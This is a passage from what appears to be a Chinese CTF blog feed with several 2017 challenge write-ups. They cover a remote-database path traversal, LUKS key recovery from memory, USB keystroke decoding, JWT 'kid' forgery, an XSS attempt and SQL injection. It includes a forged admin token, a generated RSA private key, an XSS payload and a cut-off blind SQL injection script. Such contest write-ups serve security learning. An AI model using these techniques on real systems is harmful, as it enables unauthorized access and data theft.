先配置远程数据库可以访问。修改/etc/mysql/mysql.conf.d/mysqld.cnf。将里面的bind-address = 127.0.0.1注释掉。 接下来配置mysql。这里我用root身份登陆：12345678910111213141516171819202122mysql&gt; USE wmwcms;Database changedmysql&gt; CREATE TABLE `user` ( -&gt; `id` INT AUTO_INCREMENT, -&gt; `name` VARCHAR(100) NULL, -&gt; `pwd` VARCHAR(64) NOT NULL, -&gt; `portrait` VARCHAR(64) DEFAULT &quot;../server/flag&quot;, -&gt; PRIMARY KEY (`id`), -&gt; UNIQUE KEY `Duplicate_name` (`name`) -&gt; ) ENGINE=InnoDB DEFAULT CHARSET=utf8;Query OK, 0 rows affected (0.19 sec)mysql&gt; INSERT INTO `user` (`name`, `pwd`) values (&quot;test&quot;, &quot;a94a8fe5ccb19ba61c4c0873d391e987982fbbd3&quot;);Query OK, 1 row affected (1.06 sec)mysql&gt; select id,name,pwd,portrait from user;+----+------+------------------------------------------+----------------+| id | name | pwd | portrait |+----+------+------------------------------------------+----------------+| 1 | test | a94a8fe5ccb19ba61c4c0873d391e987982fbbd3 | ../server/flag |+----+------+------------------------------------------+----------------+1 row in set (0.00 sec) 然后创建wmwcms用户，@后面有个%，表示可以远程登陆：12mysql&gt; CREATE USER &apos;wmwcms@%&apos; IDENTIFIED BY &quot;%glVYKTkLtQ22&quot;;Query OK, 0 rows affected (2.35 sec) 并为它授权:12mysql&gt; grant all privileges on wmwcms.* to &apos;wmwcms&apos;@&apos;%&apos; identified by &apos;%glVYKTkLtQ22&apos;;Query OK, 0 rows affected, 1 warning (0.03 sec) 这样当我们传入的GET参数为dsn=wmwcms;host=yourvps;port=yourport，后端的sql.php中的pdo会去连接你远程的数据库。之后执行img.php时，从中取出的portrait为我们数据库中的portrait字段，这里为../server/flag。继续执行则到了echo file_get_contents($portrait);，也即执行echo file_get_contents(&quot;../server/flag&quot;); 为什么数据库中要设置成../server/flag，注意app.php是在public文件的，而且默认的$portrait = &quot;img/user.png&quot;，也表明是在public文件夹下。而从源码中可知，flag在server文件夹下，所以需要返回上一层文件夹才能读取。 flag:1ISG&#123;a107063477b1dd64dabbcaeebf636f7b&#125;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Hackit2017-Cypherpunk’s nightmare-writeup]]></title>
      <url>%2F2017%2F08%2F30%2FHackit2017-Cypherpunk%E2%80%99s-nightmare-writeup%2F</url>
      <content type="text"><![CDATA[Hackit2017-Cypherpunk’s nightmare-writeupLUKS aeskeyfind Task1234Description: Our officers just have made cold boot attack on the suspect&apos;s computer. Your role is to recover the content of this encrypted hard drive.Attachment: (none)Webpage: https://mega.nz/#!VdRAkaKT!xP7s74jwnlGmR2spg9RNaKFf5GmCGAv-pxW8aPZNkOwHint: (none) Solution题目提供了一个压缩包，解压缩后得到三个文件：123encrypted.ddmemdump.elf.gz __MACOSX 先看看第一个文件： 可以看到这是一个LUKS加密文件，要解密需要提供密码。结合题目的另外一个文件memdump.elf.gz，我们可以利用工具aeskeyfind来提取藏在内存中的aeskey。 可以通过下面的命令安装：1apt-get install aeskeyfind 将memdump.elf.gz压缩包解压后得到data文件，运行aeskeyfind：1aeskeyfind -v data 结果如下：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859FOUND POSSIBLE 128-BIT KEY AT BYTE bf16da0KEY: 9e90126c33c85d9a6913e649301b5dcfEXTENDED KEY:9e90126c33c85d9a6913e649301b5dcf30dc98680314c5f26a0723bb5a1c7e74ae2f0ad6ad3bcf24c73cec9f9d2092eb1d60e388b05b2cac7767c033ea4752d8b560820f053baea3725c6e90981b3c480a8bd0490fb07eea7dec107ae5f72c3242faf3904d4a8d7a30a69d00d551b132d332d0939e785de9aedec0e97b8f71db209169b2bee9345b1037f4b26bb88569570690cde9efa496f9d850249260d54db105738258ead714a13287303352527dCONSTRAINTS ON ROWS:00000004000000000000000000000000000000be0000000000000000000000000000005e0000000000000000000000000000008700000000000000000000000000000046000000000000000000000000000000d900000000000000000000000000000003000000000000000000000000000000210000000000000000000000000000007f0000000000000000000000000000004f000000000000000000000000FOUND POSSIBLE 128-BIT KEY AT BYTE bf16fa0KEY: 683c5a4bf8f1cedf5b649c482e48e639EXTENDED KEY:683c5a4bf8f1cedf5b649c482e48e6393bb2487ac34386a598271aedb66ffcd49102003452418691ca669c7c7c0960a894d2c224c69344b50cf5d8c970fcb8612cbe2d75ea2d69c0e6d8b109962409680abf68e5e0920125064ab02c906eb944b5e97385557b72a05331c28cc35f7bc83ac89bab6fb3e90b3c822b87ffdd504f7b9b1fbd1428f6b628aadd31d7778d7e95c6ecb381ee1a05a944c7347e334a4a60103a40e1fe204548bae7713689ad3bCONSTRAINTS ON ROWS:000000310000000000000000000000000000004e000000000000000000000000000000100000000000000000000000000000005100000000000000000000000000000090000000000000000000000000000000600000000000000000000000000000002e000000000000000000000000000000160000000000000000000000000000000e000000000000000000000000000000f3000000000000000000000000Keyfind progress: 100% 重点是得到了两个KEY:12KEY: 9e90126c33c85d9a6913e649301b5dcfKEY: 683c5a4bf8f1cedf5b649c482e48e639 先拿一个key试试：1echo &quot;9e90126c33c85d9a6913e649301b5dcf&quot; | xxd -r -p &gt; Safe.key 尝试解密：1cryptsetup luksOpen --master-key-file Safe.key encrypted.dd safe-home 但是提示出错：1无法从密钥文件 Safe.key 读取 32 字节。 我们看看Safe.key是怎样的； 发现只有十六个字节。 结合有两个key，我们把两个合起来试试：12345root@chybeta:~/Desktop/nightmare# echo &quot;9e90126c33c85d9a6913e649301b5dcf683c5a4bf8f1cedf5b649c482e48e639&quot; | xxd -r -p &gt; Safe.keyroot@chybeta:~/Desktop/nightmare# cryptsetup luksOpen --master-key-file Safe.key encrypted.dd safe-home卷密钥与卷不匹配。root@chybeta:~/Desktop/nightmare# echo &quot;683c5a4bf8f1cedf5b649c482e48e6399e90126c33c85d9a6913e649301b5dcf&quot; | xxd -r -p &gt; Safe.keyroot@chybeta:~/Desktop/nightmare# cryptsetup luksOpen --master-key-file Safe.key encrypted.dd safe-home 然后在kali系统中可以发现已经可以直接打开卷宗。 得到flag：1h4ck1t&#123;Not_paranoid_enough&#125; 也可以通过挂载来实现1234567891011root@chybeta:~/Desktop/nightmare# ls -l /dev/mapper/总用量 0crw------- 1 root root 10, 236 8月 25 05:25 controllrwxrwxrwx 1 root root 7 8月 25 05:26 safe-home -&gt; ../dm-0root@chybeta:~/Desktop/nightmare# mkdir /mnt/safe-homeroot@chybeta:~/Desktop/nightmare# mount /dev/mapper/safe-home /mnt/safe-home/root@chybeta:~/Desktop/nightmare# cd /mnt/safe-home/root@chybeta:/mnt/safe-home# lsflag.txt Melkor_ELF_fuzzerroot@chybeta:/mnt/safe-home# cat flag.txth4ck1t&#123;Not_paranoid_enough&#125;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Hackit2017-USB ducker-writeup]]></title>
      <url>%2F2017%2F08%2F30%2FHackit2017-USB-ducker-writeup%2F</url>
      <content type="text"><![CDATA[Hackit2017-USB ducker-writeupusb keyboard pcap Task1234Description: This file was captured from one of the computers at the Internet cafe. We think that the hacker was using this computer at that time. Try to get his secret documents. ( flag format is flag&#123;...&#125; )Attachment: (none)Webpage: https://mega.nz/#!NVJ1kZCR!mDxd7V0rHtMStePa-tUEHPW-SyAxQ6f1zRDCTxX8y3MHint: (none) Solution题目提供了pcap文件。 可以知道对应的设备为apple的keyboard。 对于keyborad的数据传输，在数据包的Leftover Capture Data中，根据这篇文章： USB鼠标、键盘数据格式 和 HID Keyboard report descriptor。键盘发送给PC的数据每次8个字节，假设收到的数据为：102:00:04:00:00:00:00:00 第一个字节是modifier keys，对应的规则如下：12345678|--bit0: Left Control是否按下，按下为1 |--bit1: Left Shift 是否按下，按下为1 |--bit2: Left Alt 是否按下，按下为1 |--bit3: Left GUI 是否按下，按下为1 |--bit4: Right Control是否按下，按下为1 |--bit5: Right Shift 是否按下，按下为1 |--bit6: Right Alt 是否按下，按下为1 |--bit7: Right GUI 是否按下，按下为1 一个字节是8位，这里是02，即对应着0000 0010，即可解码为Left Shift，也就是说按下了键盘左边的Shift键。假若数据为00，则表示啥都不做。 第二个字节是padding，默认为00。可略过不提。 第三个字节起到第八个字节为普通按键，解码规则可以根据 Universal Serial Bus (USB)中第53页的规则来解码。 比如说我们收到了数据为：104:00:00:00:00:00 根据解码规则，以及第一字节shift被按下，可知为大写字母A。 接下去开始针对题目提供的数据包进行分析。根据 https://www.wireshark.org/docs/dfref/u/usb.html 可以知道 Leftover Capture Data 所对应的Field name为 usb.capdata，我们可以把值为00:00:00:00:00:00:00:00的数据过滤掉，因为它表示啥都不输入。 而我们的目标是keyboard的数据，从pcap包中看它对应的设备Device address为3，所对应的Field name为usb.device_address。 我们可以使用tshark命令提取对应的数据，并将其保存到usbdata.txt中。1tshark -r task.pcap -Y &quot;usb.capdata != 0 and usb.device_address==3&quot; -T fields -e usb.capdata &gt; usbdata.txt 提取出来的数据差不多这样：(好吧，至于为什么还有00:00:00:00:00:00:00:00，哪位解释下) 由于还有一些零行，可以用下面命令再过滤一遍：1cat usbdata.txt | grep -v &quot;00:00:00:00:00:00:00:00&quot; &gt; usbdata_filter.txt 然后根据解码规则进行解码。脚本如下：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879# -*- coding: utf-8 -*-KEYCODE = &#123; 0x04:['a', 'A'], 0x05:['b', 'B'], 0x06:['c', 'C'], 0x07:['d', 'D'], 0x08:['e', 'E'], 0x09:['f', 'F'], 0x0A:['g', 'G'], 0x0B:['h', 'H'], 0x0C:['i', 'I'], 0x0D:['j', 'J'], 0x0E:['k', 'K'], 0x0F:['l', 'L'], 0x10:['m', 'M'], 0x11:['n', 'N'], 0x12:['o', 'O'], 0x13:['p', 'P'], 0x14:['q', 'Q'], 0x15:['r', 'R'], 0x16:['s', 'S'], 0x17:['t', 'T'], 0x18:['u', 'U'], 0x19:['v', 'V'], 0x1A:['w', 'W'], 0x1B:['x', 'X'], 0x1C:['y', 'Y'], 0x1D:['z', 'Z'], 0x1E:['1', '!'], 0x1F:['2', '@'], 0x20:['3', '#'], 0x21:['4', '$'], 0x22:['5', '%'], 0x23:['6', '^'], 0x24:['7', '&amp;'], 0x25:['8', '*'], 0x26:['9', '('], 0x27:['0', ')'], 0x28:['\n','\n'], 0x2C:[' ', ' '], 0x2D:['-', '_'], 0x2E:['=', '+'], 0x2F:['[', '&#123;'], 0x30:[']', '&#125;'], 0x32:['#','~'], 0x33:[';', ':'], 0x34:['\'', '"'], 0x36:[',', '&lt;'], 0x37:['.', '&gt;'], 0x38:['/', '?'], 0x2b:['\t','\t'], 0x4f:[u'→',u'→'], 0x50:[u'←',u'←'], 0x51:[u'↓',u'↓'], 0x52:[u'↑',u'↑']&#125;NA_KEYCODE = &#123;0,1,2,3&#125;file = open("usbdata_filter.txt","rb")result = ""while 1: data = file.readline() if not data: break data = data[:-1].split(":") normalcode = int(data[2],16) if normalcode in NA_KEYCODE: continue if data[0] == '02': shiftcode = 1 else: shiftcode = 0 # print(normalcode, shiftcode) result += KEYCODE[normalcode][shiftcode]file.close()print(result) 解出来为：12345wkfb3&apos;↑[↑l↑#↑&#123;w$↓&gt;b↓ag↓[e↓ci.[↑[f↑&#123;k↑n$↑ju&#125;↓:↓3↓u↓%=↑~↑y↑6↑,&apos;↓p↓b↓7↓%&amp;↑d↑0↑j↑pt↓i↓a↓[↓k(↑=↑r↑m↑]=↓0↓d↓&gt;↓lc↑*↑_↑&#123;↑j%↓u↓s↓(↓*2↑0↑n↑&apos;↑;9↓h↓4↓]↓y4↑&apos;↑k↑;↑+p↓f↓e↓$↓!&#125;↑1↑_↑k↑s&amp;↓s↓2↓c↓%q↑$↑.↑!↑#,↓s↓0↓c↓z3↑e↑&#125;↑-↑i 打出来：12345w&#123;w$ju&#125;,&apos;pt]=j%;9+ps&amp;#,k#&gt;bn$:6pjim0&#123;u&apos;h;fks!s-flag&#123;k3yb0ard_sn4ke_2.0&#125;b[[e[fu~7d[=&gt;*(0]&apos;$1c$ce3&apos;ci.[%=%&amp;k(lc*2y4!&#125;%qz3]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[HITB CTF 2017-Pasty-writeup]]></title>
      <url>%2F2017%2F08%2F29%2FHITB-CTF-2017-Pasty-writeup%2F</url>
      <content type="text"><![CDATA[HITB CTF 2017-Pasty-writeup JWT安全性问题 Task12Can you find the administrator&apos;s secret message?http://47.74.147.52:20012 Solution先看看基本功能。注册： 登陆： 写paste，保存: 可以对保存的paste进行下载: 可以看到注册后返回了一大串的字符串，之后写paste保存时即以这个字符串作为身份认证。1eyJraWQiOiJrZXlzLzNjM2MyZWExYzNmMTEzZjY0OWRjOTM4OWRkNzFiODUxIiwidHlwIjoiSldUIiwiYWxnIjoiUlMyNTYifQ.eyJzdWIiOiJjaHliZXRhIn0.nlSBeeMh5XvdSjs0j_Rs71n0EGBYfrzKfkDq2vnR4jrgYiHCzlZ4R2uwsn0mf3Cpqis6bSAxqB-FR1Af5KYFZe6X_gWf57du4JmPfueHumijptaEJ6Ym23AcIS0HoFSV45PoTv6McEf6vvd0SG7SdECoFv97MCl3mMraedyTCy5p1WJ0ssnOs886Noyn5ak01Eeoi3WA3lVMGflIAft_uIx0pRlUZrkB3WWNYMsecWS9ih1fpMvb-cUYP5s6T_QjW68mQ40QArKa7iRDm3IhNipRa_RmziwPdo1Nh2l0kGGALpBhd1kqh8KdEbp2Kz_sPza6O-iJBX88ImeMEgXI5A 刚接触时不知道是啥，就拿去用base64解了一下，虽然解出来后后面出现了一大堆的乱码，不过前面解出来入下：1&#123;&quot;kid&quot;:&quot;keys/3c3c2ea1c3f113f649dc9389dd71b851&quot;,&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;RS256&quot;&#125; 然后就开始查找关于JWT的资料了。在 https://jwt.io/ 上可以对字符串进行debugger。 JWT由三部分组成。第一部分是头部，原始信息是json格式，包含使用的算法(alg)，类型(typ)，可选的kids字段，将头部原始信息进行base64编码后得到了第一部分字段：1eyJraWQiOiJrZXlzLzNjM2MyZWExYzNmMTEzZjY0OWRjOTM4OWRkNzFiODUxIiwidHlwIjoiSldUIiwiYWxnIjoiUlMyNTYifQ 第二部分是payload，原始信息是json格式，包含一些重要信息，比如本题中是&quot;sub&quot;: &quot;chybeta&quot;，这对应着账号的用户，将这部分原始信息进行base64编码后得到第二部分字段：1eyJzdWIiOiJjaHliZXRhIn0 第三部分，将第一部分和第二部分字段用点号.连接后根据第一部分里的alg算法进行签名。在本题中采用的是RS256算法:1nlSBeeMh5XvdSjs0j_Rs71n0EGBYfrzKfkDq2vnR4jrgYiHCzlZ4R2uwsn0mf3Cpqis6bSAxqB-FR1Af5KYFZe6X_gWf57du4JmPfueHumijptaEJ6Ym23AcIS0HoFSV45PoTv6McEf6vvd0SG7SdECoFv97MCl3mMraedyTCy5p1WJ0ssnOs886Noyn5ak01Eeoi3WA3lVMGflIAft_uIx0pRlUZrkB3WWNYMsecWS9ih1fpMvb-cUYP5s6T_QjW68mQ40QArKa7iRDm3IhNipRa_RmziwPdo1Nh2l0kGGALpBhd1kqh8KdEbp2Kz_sPza6O-iJBX88ImeMEgXI5A 在服务器返回给我们的头部信息中，有一个是：1&quot;kid&quot;:&quot;keys/3c3c2ea1c3f113f649dc9389dd71b851&quot; 关于kid字段(key ID)，它指定了用哪一个key来加密。可以看看这里：What’s the meaning of the “kid” claim in a JWT token? 访问：1http://47.74.147.52:20012/keys/ 可以发现里面有许多pem公钥，我们字段相符合即为3c3c2ea1c3f113f649dc9389dd71b851.pem。 结合头部的alg信息，我们知道它采用的是SH256即sha256签名，这种方式下，发送方（即我们）要用私钥对签名进行加密，接收方（即服务器端）用公钥进行解密，而从头部kid字段知道，公钥的地址实际上是我们可以指定的。所以攻击流程如下: 我们先生成公钥私钥对。 用公钥私钥在 jwt.io 上进行签名伪造jwt，其中kid字段指明我们公钥的地址。 服务器端收到jwt后，用kid字段地址中的公钥进行解密，由于公钥和私钥是我们伪造的，所以解密是能成功的。 拿flag。 利用openssl生成公钥私钥对。公钥：123456-----BEGIN PUBLIC KEY-----MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCdgyNwNiMLtNqIp9y/Iz5q7jsErbxerAjPzF+vkAhbMEZb0+3LzK22kE6ArHBtDeME0gxCM1dBZgXVZ0Mg+yyKnUIvCo9mGCJ7rFsw9BAOIAGGu3pnwr5CDt05qTsarlDxZ1BBsSnH51OtYZvyclGSuPpbxW+zblOEFj0443zTRwIDAQAB-----END PUBLIC KEY----- 私钥:123456789101112131415-----BEGIN RSA PRIVATE KEY-----MIICXAIBAAKBgQCdgyNwNiMLtNqIp9y/Iz5q7jsErbxerAjPzF+vkAhbMEZb0+3LzK22kE6ArHBtDeME0gxCM1dBZgXVZ0Mg+yyKnUIvCo9mGCJ7rFsw9BAOIAGGu3pnwr5CDt05qTsarlDxZ1BBsSnH51OtYZvyclGSuPpbxW+zblOEFj0443zTRwIDAQABAoGAVfIodCIWHV0hoU929BSXCmHTckoabs4QQNKTo4hEBv3gZlrNdlbIssUrEKsG7XqWVRsH9VduVREGPduKlYR4WI8yPrjUygUuH7GyrC2w44VtCZQ+3zLObknC7RuA+DBWgpMTBNF2f3Tpsj6kkSZXN97X1jS9azUkK1uxeJcG8YECQQDI6s3CjTPwQlr3h9kxEFPZDIbqjJjWjzY9CFP+A1nOOsrOjNSj9Mf+Qv/n6oLglLopzSu2hM7Iozwg7EBjWiYrAkEAyLH/ROQNFmgrBC+QV7HUsOdgQDPiCftEADZSm+IMzpItoTMMHhQBUVjJl8TLd8qajItN+mOBb6Eoddq7u5X1VQJAevvff1tXk5XKgQJS3EmWSaH1Y9U0KQH4vVs/rpj2e9pZEh36e3H2iZkRdDCEdFwVqEjCnTKmMQJaZ/y1XRttiQJBAJcapSZ6SXxIW7LgGN5d7tRusGJGbfaz7sP2IoZpUNkq6B4JcCMpTsCvh8C0E7mSmoAc1k4iIy8n+G2bjWM0Ca0CQHHZ/PXOoCKCGi8mB98pdB36VjbTX81giIboYJXhbVeuvXvP1EUuGsjDfk+bX1oFxgauqOA7i7oY+sN5JNdO5Fk=-----END RSA PRIVATE KEY----- 用之前注册的账号写一个paste，内容为公钥 利用下载功能获取到公钥的保存地址，这里为 /api/paste/fcb82912-1c84-4ce6-9713-755d5f142066?raw。 我们想要让服务器端用我们的公钥来加密，所以在伪造jwt的头部的kid字段应为：1&quot;kid&quot;:&quot;/api/paste/fcb82912-1c84-4ce6-9713-755d5f142066?raw&quot; 但是由前面观察keys文件夹知道，服务器端会把传进来的url后面加上.pem。即&quot;kid&quot;:&quot;keys/3c3c2ea1c3f113f649dc9389dd71b851&quot;会变成去访问keys/3c3c2ea1c3f113f649dc9389dd71b851.pem 可以在?raw后面加上一个&amp;，这样加上去后的.pem不会变成后缀而是被当成一个参数。访问 http://47.74.147.52:20012/api/paste/fcb82912-1c84-4ce6-9713-755d5f142066?raw&amp;.pem 即访问 http://47.74.147.52:20012/api/paste/fcb82912-1c84-4ce6-9713-755d5f142066?raw ，即我们paste/公钥的保存地址。 接下来用 https://jwt.io/ 来生成伪造的jwt。由于要伪造admin，所以sub字段要修改为admin。在公钥和私钥部分填上我们生成的公钥和私钥，在头部kid字段填上公钥的地址。 得到：1eyJraWQiOiJhcGkvcGFzdGUvZmNiODI5MTItMWM4NC00Y2U2LTk3MTMtNzU1ZDVmMTQyMDY2P3JhdyYiLCJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.IW5dnvpZAnsmIb4CrAPdwcTApLMzuB4LaDZxzm6nLwRKp4H6SCZUuPi71daWstfUDEGxMmBucTnHmaBCb4VZfxMrKDx0G27J-yJGW-SpGE9j61Punpv0vTaVw0H5SVkU6IZud_OvVWIe6vf_ffmup0Mou7GpCvOn6fUg6XYk8O0 之后在每次操作中，要记得把Authorization字段替换成对应的伪造jwt。 flag:1HITB&#123;b128a14885c4974c4a7016eb1d79aae6&#125;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Hackit2017-H4ck3rM1nd-writeup]]></title>
      <url>%2F2017%2F08%2F28%2FHackit2017-H4ck3rM1nd-writeup%2F</url>
      <content type="text"><![CDATA[跟着wp做的。 Task1234Description: Even hackers want to share their thoughts :)Attachment: (none)Webpage: http://tasks.ctf.com.ua:13373Hint: (none) Solution先看看基本功能。 注册，需要填写一个secret： 登陆后： 可以看一个profile: 而edit点进去后可以修改about字段。 查看profile.php源代码，发现有一些提示： 注意上图，我们在注册时填入的secret是放在input标签里的：1Secret: &lt;input id=&quot;secret&quot; name=&quot;secret&quot; value=&quot;mygod&quot; type=&quot;text&quot;/&gt; 如果我们在注册时填写secret为:1&quot;/&gt;&lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt;&lt;&quot; 也许能构造出xss？但很可惜被过滤掉了： 可以看到&gt;和&lt;都被实体化了。 回到profile.php，查看edit功能，普通的xss攻击不成功，这里会直接把尖括号直接过滤掉。尝试CSS Injection。 Refference CTF Write-Up - HackIT CTF 2017 Web200]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[ISG2017-赛前练手题—writeup]]></title>
      <url>%2F2017%2F08%2F28%2FISG2017-%E8%B5%9B%E5%89%8D%E7%BB%83%E6%89%8B%E9%A2%98%E2%80%94writeup%2F</url>
      <content type="text"><![CDATA[ISG2017-赛前练手题—writeup 秘密文件12在某个员工的电脑上发现了一份奇怪的文件，你能找到什么东西吗？奇怪的文件(https://play.chinaisg.org/attachment/download/secret.backup) 下载下来后打开，看起来是流量包。尾部发现一些base64串。解一下：123456789import base64pngdata = "iVBORw0KGgoAAAANSUhEUgAAARgAAAEYCAIAAAAI7H7bAAAG7ElEQVR4nO3dUY7bOgwF0OSh+9/ydAFPASTwknKm53wWqa2JcyGAkqn3z8/PC6j57/YA4DcQJAgQJAgQJAgQJAgQJAj4s/zX9/s9PI4d+5X6+viX99q/7KehFq9QH8DS8rLFAZyOoXivMZ/+KDMSBAgSBAgSBAgSBAgSBAgSBKzL30uT+8SLpc+j0u3+h/c/eXSvpaYB7I+qqSa+f9mlx/4IzUgQIEgQIEgQIEgQIEgQIEgQcFD+XmraZ90xgKMd2c+sCBdrx5+uMDmADtd/hC8zEkQIEgQIEgQIEgQIEgQIEgRUy9/PVC9JFy9bb35S/ORRPbep1n+9LD7JjAQBggQBggQBggQBggQBggQBX1/+bmpRPdak++gK9e7nxdE+sx/3E5iRIECQIECQIECQIECQIECQIECQIKC6jvRPbZXfV/9aiotLTS2T6jp+ME/4EZqRIECQIECQIECQIECQIECQIOCg/P3MLfST9dymLkIdTXyaKsLXz5B95o/wZUaCCEGCAEGCAEGCAEGCAEGCgPcTds7e1VFAb/pWmxrbN7VM+qd+WmYkCBAkCBAkCBAkCBAkCBAkCGhpon+9h/2RyR72YwOY/FqOTO5Vn/wVmZEgQJAgQJAgQJAgQJAgQJAgoFr+bqpmdhSajxqSNN2reNlJk11lJg/MPbrC/jXNSBAgSBAgSBAgSBAgSBAgSBCwLn9/UZeP4jWPLlsvlHd8Xdf3U9fXFYoDeAIzEgQIEgQIEgQIEgQIEgQIEgQIEgRUm+hPrjg1LZgUlybqbxZ0PIKm9zh+QV/8jsf9MiNBhCBBgCBBgCBBgCBBgCBBwLr83XSo6Be53i+/eM1Pvv39lCO6CMGXESQIECQIECQIECQIECQIWHcR2q/SNvWwn9xlXPy7liaPEZg0+bAmG/bvD+ATMxIECBIECBIECBIECBIECBIEHDQ/mTxUdN/1Qvkz1Rvb7z/ZyXvt//dPij9ju7+hkSBBgCBBgCBBgCBBgCBBQLX83eSZo9pX3+p+vf/ME06h3fzvk5S/oZEgQYAgQYAgQYAgQYAgQYAgQcC6i9C+phNUO5YLJtsYHfWVv760MvkuzORrL2PnI7/MSBAhSBAgSBAgSBAgSBAgSBBwUP6ebGo+2VZm6fo7I8+sPh8NtVjrry9LTD5EMxIECBIECBIECBIECBIECBIEtDTRr5usdO8P4Bc0u5nc6n7dZP3djAQBggQBggQBggQBggQBggQBB+Xv6p1ud0SpH3W6f9nJDdFHJgdw/XzhpaYXC8xIECBIECBIECBIECBIECBIEFDt/V2vGy6v8MxNyt/VU6VDvffIMw/M3b/XJ2YkCBAkCBAkCBAkCBAkCBAkCFjv/r6+IXrpmbu/J+9V79HxzNbbTb+ByQ7yZiQIECQIECQIECQIECQIECQIECQIOFhHaqrKN60OFTU10f8Fb4L83/V3Q5oWzY7uZUaCAEGCAEGCAEGCAEGCAEGCgPtN9McKspNF0rrrZf3619Lxdkb9ye7zGgVMEyQIECQIECQIECQIECQIWDfRv76f93qVdt/Y+sErsUl58gzZph30Rft/19H4zUgQIEgQIEgQIEgQIEgQIEgQcHCG7OQW3etNQppqr2Nl/aNa/2Rbm/2/63qh/IgZCQIECQIECQIECQIECQIECQIOyt+Tm3k7auKT7UTq9kfb1Kdlsv3LZP26aau7GQkCBAkCBAkCBAkCBAkCBAkCBAkCqq9RXG/iU7/m9bbu9RcWOnQs5Q1rej1kyYwEAYIEAYIEAYIEAYIEAYIEAeszZJ/Z/nypPv5nVp+XmobadNbq9eY+HW+CaKIPjQQJAgQJAgQJAgQJAgQJAta7v5/Zr2epaZPy9dY8Hd3uj+416fqZCUt2f8M0QYIAQYIAQYIAQYIAQYKAdfn7+r7dpevbzzt2yp9+OP7fX0993JMLG/UBmJEgQJAgQJAgQJAgQJAgQJAgoNr7u0mxy0dT5XTysvuaOq1fb7Qy+bzqT9aMBAGCBAGCBAGCBAGCBAGCBAEH5e+lpn4gxQFcr3QfVZ8nK/hLHYsNTQOoa6qJm5EgQJAgQJAgQJAgQJAgQJAgQJAgoLqO9ExH6xKTC1nXz6udXJ66/spG8V5HzEgQIEgQIEgQIEgQIEgQIEgQ8PXl76ZjVYuf/GTssNTJF0mOav37A6s/2clTF8xIECBIECBIECBIECBIECBIEFAtf0921t/X1Oxm31EXoWKhuV7rPypqF01uP59kRoIAQYIAQYIAQYIAQYIAQYKAg/L3ZPn4uusF9CaTG6KLA5i8Zv1xm5EgQJAgQJAgQJAgQJAgQJAg4P0LNt7CdWYkCBAkCBAkCBAkCBAkCBAkCBAkCPgLVlXCW8nFW3sAAAAASUVORK5CYII="f = open("flag.png","wb")f.write(base64.b64decode(pngdata))f.close() 得到一张二维码，扫后得到flag：1ISG&#123;5a9f1ce5c7359a1b1076b5143b946a3b&#125; 简单的apk123能够通过APK认证的字符串即为本题flag下载APK(https://play.chinaisg.org/attachment/download/simple-code.apk) 其实这是mobile，干脆写在这里不另开了。用jeb打开，然后发现是kotlin，先果断放弃哈哈哈。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Hackit2017-Weekands of hacker-writeup]]></title>
      <url>%2F2017%2F08%2F28%2FHackit2017-Weekands-of-hacker-writeup%2F</url>
      <content type="text"><![CDATA[Hackit2017-Weekands of hacker-writeup脑脑脑洞题？ Task1234Description: Try to find something weird here...Attachment: (none)Webpage: (none)Hint: Format answer is h4ck1t&#123;&lt;something&gt;&#125;. You must type right flag on keyboard, where? Feel you real hacker. Hide Solution没有给出网址，那就只能在https://ctf.com.ua里咯。 在https://ctf.com.ua/js/jquery.js里有一段：12345678910111213typer:function(key)&#123; $m=[70,70,71,79,86,74,71,83,80,74,77,86,81,95];//times alt is pressed for Access Granted $c=Typer.counter-211; if (!Typer.failed &amp; $c&gt;=0)&#123; if (!(key==$m[$c]-$c))&#123; Typer.failed=true; Typer.makeDenied(); &#125; if($c+1==$m.length)&#123; Typer.makeAccess() &#125; &#125;// remove all existing popuccess();&#125;, 12345key = ""m = [70,70,71,79,86,74,71,83,80,74,77,86,81,95]for i in range(len(m)): key += chr(m[i]-i)print(key) 得到:1FEELREALHACKER 再把它转成小写，flag:1h4ck1t&#123;feelrealhacker&#125; tucao这是脑洞题？…]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Hackit2017-V1rus3pidem1c-writeup]]></title>
      <url>%2F2017%2F08%2F28%2FHackit2017-V1rus3pidem1c-writeup%2F</url>
      <content type="text"><![CDATA[Hackit2017-V1rus3pidem1c-writeupsql注入php伪协议：php://filter，zip://，phar:// Task1234567Description: Hackers created an automated site for virus attacks on the Government. You must find and catch them all!Attachment: (none)Webpage: http://tasks.ctf.com.ua:13372Hint: (none) 先看看基本的功能，你可以选择对应的国家，然后上传你的virus，但题目没有返回上传后的保存的文件路径信息。 Solutionsql注入点一下send，会发现url变为：1http://tasks.ctf.com.ua:13372/index.php?country=Germany 对于get参数，首先想的一般是sql注入；1python sqlmap.py -u http://tasks.ctf.com.ua:13372/index.php?country=Germany 接下去用下面的脚本注出数据：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091import requestsimport stringimport sysglobal findBitdef sendPayload(payload): proxy = &#123;"http":"http://127.0.0.1:8080"&#125; url = "http://tasks.ctf.com.ua:13372/index.php?country=" + payload # headers = &#123;"Content-Type": "application/x-www-form-urlencoded"&#125; content = requests.get(url,proxies=proxy) return content.textflag = "Select virus for Germany"def generateTarget(flag): if flag == "database": return "database()" elif flag == "tables": return "(SELECT%09GROUP_CONCAT(table_name%09SEPARATOR%090x3c62723e)%09FROM%09INFORMATION_SCHEMA.TABLES%09WHERE%09TABLE_SCHEMA=0x57484154415245594f55444f494e4748455245)" elif flag == "columns": return "(SELECT%09GROUP_CONCAT(column_name%09SEPARATOR%090x3c62723e)%09FROM%09INFORMATION_SCHEMA.COLUMNS%09WHERE%09TABLE_NAME=0x636f756e7472696573)" elif flag == "data": return 